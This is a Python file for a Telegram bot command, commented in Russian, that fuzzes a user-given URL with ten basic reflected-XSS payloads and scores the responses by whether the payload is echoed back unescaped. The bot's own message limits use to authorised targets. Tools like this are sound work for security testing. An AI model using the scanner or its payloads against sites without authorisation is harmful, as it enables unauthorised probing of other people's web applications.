import aiohttp
from urllib.parse import quote

from telegram import Update
from telegram.ext import ContextTypes
from telegram.constants import ParseMode


# Набор XSS-пейлоадов (можно расширять)
XSS_PAYLOADS = [
    "<script>alert(1)</script>",
    "\"'><svg/onload=alert(1)>",
    "'\"><img src=x onerror=alert(1)>",
    "<script>confirm(1)</script>",
    "\"><script>alert(1)</script>",
    "';alert(1);//",
    "\"></style><script>alert(1)</script>",
    "<svg/onload=alert(1)>",
    "<img src=x onerror=alert(1)>",
    "<body onload=alert(1)>",
]

MAX_XSS_REQUESTS = 30  # ограничение, чтобы не ушатать цель


async def _fetch(session: aiohttp.ClientSession, url: str):
    try:
        async with session.get(url, timeout=10, allow_redirects=True) as resp:
            text = await resp.text(errors="ignore")
            return resp.status, text, dict(resp.headers)
    except Exception:
        return None, "", {}


def _analyze_xss(payload: str, html: str):
    """
    Очень простой эвристический анализ:
    - payload отражается "как есть" в HTML
    - не заменён на &lt;script&gt; и т.п.
    """
    if not html:
        return 0, ["нет ответа от сервера"]

    score = 0
    reasons = []

    if payload in html:
        score += 5
        reasons.append("payload отражается без экранирования")

    # Если видим HTML-экранирование — понижаем важность
    if "&lt;script" in html.lower() or "&gt;alert(1)" in html.lower():
        score -= 2
        reasons.append("похоже, HTML всё-таки экранирован (&lt; &gt;)")

    if "alert(1)" in html:
        score += 1
        reasons.append("в ответе есть строка alert(1)")

    if score < 0:
        score = 0

    return score, reasons


async def xssdeep_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """
    /xssdeep https://site.com/search?q=FUZZ
    В URL должно быть слово FUZZ, туда будет подставляться payload.
    """
    if not context.args:
        await update.message.reply_text(
            "Формат: /xssdeep https://site.com/search?q=FUZZ\n"
            "В URL обязательно должно быть слово FUZZ."
        )
        return

    raw_url = context.args[0].strip()

    if "FUZZ" not in raw_url:
        await update.message.reply_text(
            "В URL должно быть слово FUZZ.\n"
            "Пример:\n"
            "/xssdeep https://example.com/search?q=FUZZ"
        )
        return

    await update.message.reply_text(
        "🧠 XSSProbe запущен… Подставляю XSS-payload'ы и ищу отражение.\n"
        "Используй только на целях, где у тебя есть разрешение!"
    )

    results = []

    async with aiohttp.ClientSession() as session:
        for payload in XSS_PAYLOADS[:MAX_XSS_REQUESTS]:
            fuzzed_url = raw_url.replace("FUZZ", quote(payload))
            status, html, _headers = await _fetch(session, fuzzed_url)

            if status is None:
                continue

            score, reasons = _analyze_xss(payload, html)
            if score > 0:
                results.append(
                    {
                        "url": fuzzed_url,
                        "payload": payload,
                        "status": status,
                        "score": score,
                        "reasons": reasons,
                        "length": len(html),
                    }
                )

    if not results:
        await update.message.reply_text(
            "Не нашёл явных XSS по своим эвристикам.\n"
            "Но это только автоматический поиск — всё равно проверь JS/HTML руками."
        )
        return

    results.sort(key=lambda r: r["score"], reverse=True)

    lines = [
        f"🔥 XSSProbe отчёт для: {raw_url}",
        f"Проверено payload'ов: {min(len(XSS_PAYLOADS), MAX_XSS_REQUESTS)}",
        "",
        "Ниже самые подозрительные ответы (по убыванию важности):",
    ]

    for i, r in enumerate(results[:10], 1):
        reasons_text = "; ".join(r["reasons"])
        lines.append(
            f"{i}. [score={r['score']}] [HTTP {r['status']}] {r['url']}\n"
            f"   Длина ответа: {r['length']}\n"
            f"   Причины: {reasons_text}"
        )

    await update.message.reply_text("\n\n".join(lines), parse_mode=ParseMode.HTML)
